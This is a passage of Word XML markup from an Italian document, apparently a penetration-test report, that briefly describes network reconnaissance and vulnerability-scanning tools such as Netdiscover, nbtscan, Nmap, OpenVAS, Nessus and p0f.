          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> NetDiscover</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="1BFF7B43" w14:textId="40BB33A9" w:rsidR="005D1AB9" w:rsidRDefault="00B239BB" w:rsidP="005D1AB9">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidRPr="00B239BB">
        <w:t>etdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">è uno strumento di ricognizione </w:t>
      </w:r>
      <w:r w:rsidRPr="00B239BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ARP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B239BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>attivo/passivo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, inizialmente sviluppato per ottenere informazioni sulle reti </w:t>
      </w:r>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>wireless</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Può essere utilizzato anche su </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">reti commutate. Basato su </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B239BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>libnet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B239BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>libpcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, può rilevare passivamente </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> online o cercali inviando richieste </w:t>
      </w:r>
      <w:r w:rsidRPr="00B239BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ARP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352D6E32" w14:textId="77777777" w:rsidR="005D1AB9" w:rsidRDefault="005D1AB9" w:rsidP="00ED40FB">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E21F6F1" w14:textId="1BF3B544" w:rsidR="00ED40FB" w:rsidRDefault="00ED40FB" w:rsidP="00ED40FB">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc139378598"/>
      <w:r w:rsidRPr="00ED40FB">
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:t xml:space="preserve"> nbtscan</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="73FDF463" w14:textId="654417F6" w:rsidR="00ED40FB" w:rsidRPr="00ED40FB" w:rsidRDefault="00ED40FB" w:rsidP="00ED40FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nbtscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> è uno strumento in grado di ottenere informazioni sul protocollo</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> NetBIOS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>(Network Basic Input/Output System)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Il protocollo </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>NetBIOS</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:ascii="Calibri-Italic" w:eastAsia="Times New Roman" w:hAnsi="Calibri-Italic" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>consente di accedere a servizi di condivisione</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">aperta forniti da macchine </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Windows-based</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> su rete locale</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. Sapendo che la macchina </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">target </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">non ha </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED40FB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> sopra non ha senso utilizzarlo, ma viene citato per completezza</w:t>
      </w:r>
      <w:r w:rsidR="00976716">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3300D743" w14:textId="77777777" w:rsidR="00ED40FB" w:rsidRPr="00ED40FB" w:rsidRDefault="00ED40FB" w:rsidP="00ED40FB">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13993AED" w14:textId="42C0A12D" w:rsidR="00B239BB" w:rsidRPr="00550195" w:rsidRDefault="00B239BB" w:rsidP="00B239BB">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc139378599"/>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nmap</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="51E31A27" w14:textId="1D36F3B5" w:rsidR="00B239BB" w:rsidRDefault="00BF0383" w:rsidP="00B239BB">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Nmap è uno strumento u</w:t>
      </w:r>
      <w:r w:rsidR="00B239BB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">tilizzato per la fase di </w:t>
      </w:r>
      <w:r w:rsidR="00B239BB" w:rsidRPr="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>Active Service Enumeration</w:t>
      </w:r>
      <w:r w:rsidR="00F16C58">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>, viene utilizzato per ottenere informazioni sui servizi di rete erogati dalla macchina target. Quindi, uno strumento Open Source multifunzione per l’analisi di rete. Ad esempio può darci informazioni sulla S.O. sulla macchina target (</w:t>
      </w:r>
      <w:r w:rsidR="00F16C58" w:rsidRPr="00F16C58">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>fingerprinting Attivo</w:t>
      </w:r>
      <w:r w:rsidR="00F16C58">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>) o anche per verificare se una macchina target è attiva o meno (</w:t>
      </w:r>
      <w:r w:rsidR="00F16C58" w:rsidRPr="00F16C58">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>ping Scan</w:t>
      </w:r>
      <w:r w:rsidR="00F16C58">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:r w:rsidR="00F16C58">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199F4775" w14:textId="77777777" w:rsidR="003D7E9D" w:rsidRDefault="003D7E9D" w:rsidP="00B239BB">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="670A943F" w14:textId="78EF8AD0" w:rsidR="00083AF2" w:rsidRDefault="00083AF2" w:rsidP="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc139378600"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2.5 OpenVAS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="485CCEAE" w14:textId="3D88FACF" w:rsidR="00083AF2" w:rsidRDefault="00083AF2" w:rsidP="00083AF2">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Open </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> Assesment System</w:t>
      </w:r>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:ascii="SFBX1000" w:hAnsi="SFBX1000"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00083AF2">
        <w:t>è una soluzione open source molto diffusa per la scansione e la gestione automatica delle vulnerabilità. Per l’analisi delle vulnerabilità si basa su CVSS v2.0 Ratings</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181FCD0D" w14:textId="77777777" w:rsidR="00083AF2" w:rsidRDefault="00083AF2" w:rsidP="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17EC2EFA" w14:textId="215C3ECB" w:rsidR="00083AF2" w:rsidRDefault="00083AF2" w:rsidP="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc139378601"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2.6 NESSUS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="43A469A2" w14:textId="77777777" w:rsidR="00083AF2" w:rsidRPr="00083AF2" w:rsidRDefault="00083AF2" w:rsidP="00083AF2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Nessus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">è tratta di un software proprietario, prodotto dall’azienda </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Tenable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Inc. È uno strumento estremamente potente per l’analisi delle vulnerabilità. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Nessus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> consente di identificare e correggere, in maniera facile e veloce, vulnerabilità su una vasta gamma di sistemi operativi, dispositivi e applicazioni. Si occupa di rilevare:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F11D54A" w14:textId="77777777" w:rsidR="00083AF2" w:rsidRDefault="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Difetti del software;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103D9889" w14:textId="77777777" w:rsidR="00083AF2" w:rsidRDefault="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Patch mancanti;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDF5DB7" w14:textId="77777777" w:rsidR="00083AF2" w:rsidRDefault="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Malware;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ADA9F2" w14:textId="77777777" w:rsidR="00083AF2" w:rsidRDefault="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Configurazioni errate;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E75E01E" w14:textId="782C7A10" w:rsidR="00083AF2" w:rsidRPr="00083AF2" w:rsidRDefault="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>tc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6064AAC8" w14:textId="31F82CBE" w:rsidR="00083AF2" w:rsidRPr="00083AF2" w:rsidRDefault="00083AF2" w:rsidP="00083AF2">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00083AF2">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>La rilevazione delle vulnerabilità si basa sulle signature presenti nei database; quindi, effettua un matching per ogni entry presente in tali database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217D9071" w14:textId="74B5189D" w:rsidR="003D7E9D" w:rsidRPr="003F27AD" w:rsidRDefault="003D7E9D" w:rsidP="003F27AD">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc139378602"/>
      <w:r w:rsidRPr="003F27AD">
        <w:lastRenderedPageBreak/>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2" w:rsidRPr="003F27AD">
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="003F27AD">
        <w:t xml:space="preserve"> p0f</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="20052D14" w14:textId="531960F7" w:rsidR="003D7E9D" w:rsidRDefault="003D7E9D" w:rsidP="00A128FC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">p0f è uno strumento utilizzato per il </w:t>
      </w:r>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Operating</w:t>
      </w:r>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">System (OS) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D7E9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Fingerprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A128FC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Permette di lavorare sia in modalità </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>passiva</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> che </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>attiva</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>. Dove nel primo caso, si</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> basa</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>sull’analisi dei pacchetti TCP inviati durante le</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>normali attivit</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:t xml:space="preserve">à </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>di rete</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>. Invece, nel secondo caso s</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>determina il Sistema Operativo in base all’analisi</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>delle risposte</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A128FC" w:rsidRPr="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ricevute da tale macchina</w:t>
      </w:r>
      <w:r w:rsidR="00A128FC">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>. Entrambi i casi hanno dei pro e dei contro.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503171DB" w14:textId="77777777" w:rsidR="00083AF2" w:rsidRDefault="00083AF2" w:rsidP="00083AF2">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1399622F" w14:textId="07D2988D" w:rsidR="00DD2E21" w:rsidRPr="003F27AD" w:rsidRDefault="00DD2E21" w:rsidP="003F27AD">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:rStyle w:val="Titolo2Carattere"/>
          <w:b/>
          <w:caps/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc139378603"/>
      <w:r w:rsidRPr="003F27AD">
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2" w:rsidRPr="003F27AD">
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="003F27AD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003F27AD">
        <w:rPr>
          <w:rStyle w:val="Titolo2Carattere"/>
          <w:b/>
          <w:caps/>
        </w:rPr>
        <w:t>xsltproc</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="7A1BCF1C" w14:textId="2C7F3C5A" w:rsidR="00DD2E21" w:rsidRPr="00DD2E21" w:rsidRDefault="00DD2E21" w:rsidP="00DD2E21">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD2E21">
        <w:t>Xsltproc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD2E21">
        <w:t xml:space="preserve"> è uno strumento </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">utilizzato per la conversione di un </w:t>
      </w:r>
      <w:r w:rsidRPr="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>file.xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r w:rsidR="005407FF">
